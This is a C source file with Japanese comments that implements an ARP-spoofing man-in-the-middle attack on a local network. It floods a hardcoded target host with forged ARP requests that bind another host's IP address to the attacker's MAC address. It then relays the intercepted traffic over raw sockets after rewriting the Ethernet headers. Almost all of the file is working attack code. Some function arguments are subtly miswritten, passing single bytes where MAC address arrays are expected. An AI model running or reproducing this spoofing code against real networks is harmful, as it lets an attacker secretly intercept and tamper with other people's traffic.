#include	<stdio.h>
#include	<string.h>
#include	<unistd.h>
#include	<poll.h>
#include	<errno.h>
#include	<signal.h>
#include	<stdarg.h>
#include	<sys/socket.h>
#include	<arpa/inet.h>
#include	<netinet/if_ether.h>
#include    <sys/ioctl.h>
#include    <linux/if.h>
#include    <netinet/ip.h>
#include	"netutil.h"



typedef struct	{
    char	*Device1;
    char	*Device2;
    int	DebugOut;
    
    char    *ip_A;
    char    *ip_B;
}PARAM;
//ここは手動で変える必要がある！
PARAM	Param={"enp0s3","lo",1, "192.168.1.99", "192.168.1.110"};

typedef struct    {
    int    soc;
    u_char    hwaddr[6];
    struct in_addr    addr,subnet,netmask;
}DEVICE;
DEVICE	Device[2];

int	EndFlag=0;

int DebugPrintf(char *fmt,...)
{
    if(Param.DebugOut){
        va_list	args;
        
        va_start(args,fmt);
        vfprintf(stderr,fmt,args);
        va_end(args);
    }
    
    return(0);
}

int DebugPerror(char *msg)
{
    if(Param.DebugOut){
        fprintf(stderr,"%s : %s\n",msg,strerror(errno));
    }
    
    return(0);
}

int AnalyzePacket(int deviceNo,u_char *data,int size)
{
    u_char	*ptr;
    int	lest;
    struct ether_header	*eh;
    
    ptr=data;
    lest=size;
    
    if(lest<sizeof(struct ether_header)){
        DebugPrintf("[%d]:lest(%d)<sizeof(struct ether_header)\n",deviceNo,lest);
        return(-1);
    }
    eh=(struct ether_header *)ptr;
    ptr+=sizeof(struct ether_header);
    lest-=sizeof(struct ether_header);
    DebugPrintf("[%d]",deviceNo);
    if(Param.DebugOut){
        PrintEtherHeader(eh,stderr);
    }
    
    return(0);
}

//MITMパケットを検出し、IPアドレスとMACアドレスを書き換えとく
int proccessMITMPacket(int deviceNo,u_char *data,int size, in_addr_t send_ip,u_char send_mac[6],in_addr_t rec_ip,u_char rec_mac[6]){
    u_char    *ptr;
    int    lest;
    struct ether_header    *eh;
    char    buf[80];
    int    tno;
    u_char    hwaddr[6];
    
    ptr=data;
    lest=size;
    
    //イーサヘッダの分離
    if(lest<sizeof(struct ether_header)){
        DebugPrintf("[%d]:lest(%d)<sizeof(struct ether_header)\n",deviceNo,lest);
        //そもそも有効なパケットではない
        return(-1);
    }
    eh=(struct ether_header *)ptr;
    ptr+=sizeof(struct ether_header);
    lest-=sizeof(struct ether_header);
    
    //宛先MACアドレスがこのNICでなかったらそもそも違う
    if(memcmp(&eh->ether_dhost,Device[deviceNo].hwaddr,6)!=0){
        DebugPrintf("[%d]:dhost not match %s\n",deviceNo,my_ether_ntoa_r((u_char *)&eh->ether_dhost,buf,sizeof(buf)));
        //そもそも見なくて良い
        return(-1);
    }
    
    //判別
    if(ntohs(eh->ether_type)==ETHERTYPE_ARP){
        struct ether_arp    *arp;
        
        if(lest<sizeof(struct ether_arp)){
            DebugPrintf("[%d]:lest(%d)<sizeof(struct ether_arp)\n",deviceNo,lest);
            return(-1);
        }
        arp=(struct ether_arp *)ptr;
        ptr+=sizeof(struct ether_arp);
        lest-=sizeof(struct ether_arp);
        
        //        if(arp->arp_op==htons(ARPOP_REQUEST)){
        //            DebugPrintf("[%d]recv:ARP REQUEST:%dbytes\n",deviceNo,size);
        //            Ip2Mac(deviceNo,*(in_addr_t *)arp->arp_spa,arp->arp_sha);
        //        }
        //        if(arp->arp_op==htons(ARPOP_REPLY)){
        //            if(arp->arp_spa == send_ip)
        //            DebugPrintf("[%d]recv:ARP REPLY:%dbytes\n",deviceNo,size);
        //            Ip2Mac(deviceNo,*(in_addr_t *)arp->arp_spa,arp->arp_sha);
        //        }
        
        //送信者かつ受信者のIPv4アドレスをチェック
        if(*(in_addr_t *)arp->arp_spa == send_ip || *(in_addr_t *)arp->arp_tpa == rec_ip){
            //端末BへのARPパケットだったら、無視する。（フォワーディングしてあげない）
            DebugPrintf("[%d]recv:MITM ARP PACKET:%dbytes\n",deviceNo,size);
            return (-1);
        }
    }
    else if(ntohs(eh->ether_type)==ETHERTYPE_IP){
        //IPv4にしか対応してない
        struct iphdr    *iphdr;
        u_char    option[1500];
        int    optionLen;
        
        if(lest<sizeof(struct iphdr)){
            DebugPrintf("[%d]:lest(%d)<sizeof(struct iphdr)\n",deviceNo,lest);
            return(-1);
        }
        iphdr=(struct iphdr *)ptr;
        ptr+=sizeof(struct iphdr);
        lest-=sizeof(struct iphdr);
        
        //AからBへの通信のときは、IPアドレスとMACアドレスを入れ替えとく。
        if(iphdr->saddr == send_ip && iphdr->daddr == rec_ip){
            DebugPrintf("MITM PACKET\n",deviceNo,lest);
            int ii=0;
            //宛先は普通に端末BのMACアドレス
            for(ii=0; ii<6; ii++) eh->ether_dhost[ii] = rec_mac[ii];
            //送信元MACアドレスは自分
            for(ii=0; ii<6; ii++) eh->ether_shost[ii] = Device[deviceNo].hwaddr[ii];
            //IPアドレスは、送信元が端末A、宛先が端末Bになってるので変える必要はない
            return(1);
        }
    }
    
    return(0);
}

//ARPスプーフィングした後の中間者としてのブリッジ(IPForwardingをオンにしておいた方がいい。)
int MITMBridge(in_addr_t send_ip,u_char send_mac[6],in_addr_t rec_ip,u_char rec_mac[6]){
    struct pollfd    targets[2];
    int    nready,i,size;
    u_char    buf[2048];
    
    targets[0].fd=Device[0].soc;
    targets[0].events=POLLIN|POLLERR;
    targets[1].fd=Device[1].soc;
    targets[1].events=POLLIN|POLLERR;
    
    int deviceNo = 0;   //使うネットワークデバイス
    
    while(EndFlag==0){
        switch(nready=poll(targets,2,100)){
            case    -1:
                if(errno!=EINTR){
                    perror("poll");
                }
                break;
            case    0:
                break;
            default:
                
                if(targets[deviceNo].revents&(POLLIN|POLLERR)){
                    if((size=read(Device[deviceNo].soc,buf,sizeof(buf)))<=0){
                        perror("read");
                    }
                    else{
                        //TODO:この辺で、イーサヘッダとIPヘッダを書き換えて、MITMブリッジをする
                        if(AnalyzePacket(deviceNo,buf,size)!=-1){
                            //MITMパケットの場合だけ送る
                            if(proccessMITMPacket(deviceNo, buf, size, send_ip, send_mac[6], rec_ip, rec_mac[6]) ){
                                if((size=write(Device[deviceNo].soc,buf,size))<=0){
                                    perror("write");
                                }
                            }
                        }
                    }
                    
                }
                break;
        }
    }
    
    return (0);
}

int Bridge()
{
    struct pollfd	targets[2];
    int	nready,i,size;
    u_char	buf[2048];
    
    targets[0].fd=Device[0].soc;
    targets[0].events=POLLIN|POLLERR;
    targets[1].fd=Device[1].soc;
    targets[1].events=POLLIN|POLLERR;
    
    while(EndFlag==0){
        switch(nready=poll(targets,2,100)){
            case	-1:
                if(errno!=EINTR){
                    perror("poll");
                }
                break;
            case	0:
                break;
            default:
                for(i=0;i<2;i++){
                    if(targets[i].revents&(POLLIN|POLLERR)){
                        if((size=read(Device[i].soc,buf,sizeof(buf)))<=0){
                            perror("read");
                        }
                        else{
                            if(AnalyzePacket(i,buf,size)!=-1){
                                if((size=write(Device[(!i)].soc,buf,size))<=0){
                                    perror("write");
                                }
                            }
                        }
                    }
                }
                break;
        }
    }
    
    return(0);
}

int DisableIpForward()
{
    FILE    *fp;
    
    if((fp=fopen("/proc/sys/net/ipv4/ip_forward","w"))==NULL){
        DebugPrintf("cannot write /proc/sys/net/ipv4/ip_forward\n");
        return(-1);
    }
    fputs("0",fp);
    fclose(fp);
    
    return(0);
}

void EndSignal(int sig)
{
    EndFlag=1;
}

//--------------
typedef struct  {
    struct ether_header      eh;
    struct ether_arp   arp;
}PACKET_ARP;

int SendArpRequestB(int soc,in_addr_t target_ip,u_char target_mac[6],in_addr_t my_ip,u_char my_mac[6])
{
    PACKET_ARP        arp;
    int      total;
    u_char   *p;
    u_char   buf[sizeof(struct ether_header)+sizeof(struct ether_arp)];
    union   {
        unsigned long   l;
        u_char   c[4];
    }lc;
    int     i;
    
    arp.arp.arp_hrd=htons(ARPHRD_ETHER);
    arp.arp.arp_pro=htons(ETHERTYPE_IP);
    arp.arp.arp_hln=6;
    arp.arp.arp_pln=4;
    arp.arp.arp_op=htons(ARPOP_REQUEST);
    
    for(i=0;i<6;i++){
        arp.arp.arp_sha[i]=my_mac[i];
    }
    
    for(i=0;i<6;i++){
        arp.arp.arp_tha[i]=0;
    }
    
    lc.l=my_ip;
    for(i=0;i<4;i++){
        arp.arp.arp_spa[i]=lc.c[i];
    }
    
    lc.l=target_ip;
    for(i=0;i<4;i++){
        arp.arp.arp_tpa[i]=lc.c[i];
    }
    
    
    arp.eh.ether_dhost[0]=target_mac[0];
    arp.eh.ether_dhost[1]=target_mac[1];
    arp.eh.ether_dhost[2]=target_mac[2];
    arp.eh.ether_dhost[3]=target_mac[3];
    arp.eh.ether_dhost[4]=target_mac[4];
    arp.eh.ether_dhost[5]=target_mac[5];
    
    arp.eh.ether_shost[0]=my_mac[0];
    arp.eh.ether_shost[1]=my_mac[1];
    arp.eh.ether_shost[2]=my_mac[2];
    arp.eh.ether_shost[3]=my_mac[3];
    arp.eh.ether_shost[4]=my_mac[4];
    arp.eh.ether_shost[5]=my_mac[5];
    
    arp.eh.ether_type=htons(ETHERTYPE_ARP);
    
    memset(buf,0,sizeof(buf));
    p=buf;
    memcpy(p,&arp.eh,sizeof(struct ether_header));p+=sizeof(struct ether_header);
    memcpy(p,&arp.arp,sizeof(struct ether_arp));p+=sizeof(struct ether_arp);
    total=p-buf;
    
    write(soc,buf,total);
    
    return(0);
}
//--------------
//--------------
int GetDeviceInfo(char *device,u_char hwaddr[6],struct in_addr *uaddr,struct in_addr *subnet,struct in_addr *mask)
{
    struct ifreq    ifreq;
    struct sockaddr_in    addr;
    int    soc;
    u_char    *p;
    
    if((soc=socket(PF_INET,SOCK_DGRAM,0))<0){
        DebugPerror("socket");
        return(-1);
    }
    
    memset(&ifreq,0,sizeof(struct ifreq));
    strncpy(ifreq.ifr_name,device,sizeof(ifreq.ifr_name)-1);
    
    if(ioctl(soc,SIOCGIFHWADDR,&ifreq)==-1){
        DebugPerror("ioctl");
        close(soc);
        return(-1);
    }
    else{
        p=(u_char *)&ifreq.ifr_hwaddr.sa_data;
        memcpy(hwaddr,p,6);
    }
    
    if(ioctl(soc,SIOCGIFADDR,&ifreq)==-1){
        DebugPerror("ioctl");
        close(soc);
        return(-1);
    }
    else if(ifreq.ifr_addr.sa_family!=PF_INET){
        DebugPrintf("%s not PF_INET\n",device);
        close(soc);
        return(-1);
    }
    else{
        memcpy(&addr,&ifreq.ifr_addr,sizeof(struct sockaddr_in));
        *uaddr=addr.sin_addr;
    }
    
    
    if(ioctl(soc,SIOCGIFNETMASK,&ifreq)==-1){
        DebugPerror("ioctl");
        close(soc);
        return(-1);
    }
    else{
        memcpy(&addr,&ifreq.ifr_addr,sizeof(struct sockaddr_in));
        *mask=addr.sin_addr;
    }
    
    subnet->s_addr=((uaddr->s_addr)&(mask->s_addr));
    
    close(soc);
    
    return(0);
}

char *my_inet_ntoa_r(struct in_addr *addr,char *buf,socklen_t size)
{
    inet_ntop(PF_INET,addr,buf,size);
    
    return(buf);
}
//--------------

int main(int argc,char *argv[],char *envp[])
{
    char    buf[80];
    
    //----デバイスセッティング
    if(GetDeviceInfo(Param.Device1,Device[0].hwaddr,&Device[0].addr,&Device[0].subnet,&Device[0].netmask)==-1){
        DebugPrintf("GetDeviceInfo:error:%s\n",Param.Device1);
        return(-1);
    }
    if((Device[0].soc=InitRawSocket(Param.Device1,1,0))==-1){
        DebugPrintf("InitRawSocket:error:%s\n",Param.Device1);
        return(-1);
    }
    DebugPrintf("%s OK\n",Param.Device1);
    DebugPrintf("addr=%s\n",my_inet_ntoa_r(&Device[0].addr,buf,sizeof(buf)));
    DebugPrintf("subnet=%s\n",my_inet_ntoa_r(&Device[0].subnet,buf,sizeof(buf)));
    DebugPrintf("netmask=%s\n",my_inet_ntoa_r(&Device[0].netmask,buf,sizeof(buf)));
    
    if(GetDeviceInfo(Param.Device2,Device[1].hwaddr,&Device[1].addr,&Device[1].subnet,&Device[1].netmask)==-1){
        DebugPrintf("GetDeviceInfo:error:%s\n",Param.Device2);
        return(-1);
    }
    if((Device[1].soc=InitRawSocket(Param.Device2,1,0))==-1){
        DebugPrintf("InitRawSocket:error:%s\n",Param.Device1);
        return(-1);
    }
    DebugPrintf("%s OK\n",Param.Device2);
    DebugPrintf("addr=%s\n",my_inet_ntoa_r(&Device[1].addr,buf,sizeof(buf)));
    DebugPrintf("subnet=%s\n",my_inet_ntoa_r(&Device[1].subnet,buf,sizeof(buf)));
    DebugPrintf("netmask=%s\n",my_inet_ntoa_r(&Device[1].netmask,buf,sizeof(buf)));
    //----デバイスセッティングここまで
    
    DisableIpForward();
    
    signal(SIGINT,EndSignal);
    signal(SIGTERM,EndSignal);
    signal(SIGQUIT,EndSignal);
    
    signal(SIGPIPE,SIG_IGN);
    signal(SIGTTIN,SIG_IGN);
    signal(SIGTTOU,SIG_IGN);
    
    DebugPrintf("bridge start\n");
    //---ARPスプーフィング
    static  u_char    bcast[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};    //ブロードキャストMACアドレス
    char    *in_addr_text_sender = Param.ip_A;                     //ARPスプーフィング先A
    char    *in_addr_text_receiver = Param.ip_B;                   //ARPスプーフィング先B (A→Bの通信を横取りする)
    struct  in_addr    sendIp;
    struct  in_addr    recIp;
    
    inet_aton(in_addr_text_sender, &sendIp);
    inet_aton(in_addr_text_receiver, &recIp);
    
    //DebugPrintf("NextRouter=%s\n",my_inet_ntoa_r(&NextRouter,buf,sizeof(buf)));
    
    //SendArpRequestB(Device[0].soc, recIp.s_addr, bcast, Device[0].addr.s_addr, Device[0].hwaddr);
    //sendIp→recIpの通信をこちらに回すARPスプーフィング。相手のIPアドレスに、こちらは端末BのIPアドレス、かつ自分のMACアドレスを入れてリクエストを送る
    int     i=0;
    for(i=0; i<500; i++){
        SendArpRequestB(Device[0].soc, sendIp.s_addr, bcast, recIp.s_addr, Device[0].hwaddr);
    }
    
    //TODO:あとでPARAMSに移動
    static  u_char    mac_A[6]={0x68,0x05,0xCA,0x06,0xF6,0x7B};   //端末AのMACアドレス
    static  u_char    mac_B[6]={0xB8,0x27,0xEB,0x4A,0xA3,0x53};   //端末BのMACアドレス
    //---ARPスプーフィングここまで
    //---ブリッジ
    MITMBridge(sendIp.s_addr, mac_A, recIp.s_addr, mac_B);
    //Bridge();
    //---ブリッジここまで
    DebugPrintf("bridge end\n");
    
    close(Device[0].soc);
    close(Device[1].soc);
    
    return(0);
    
}
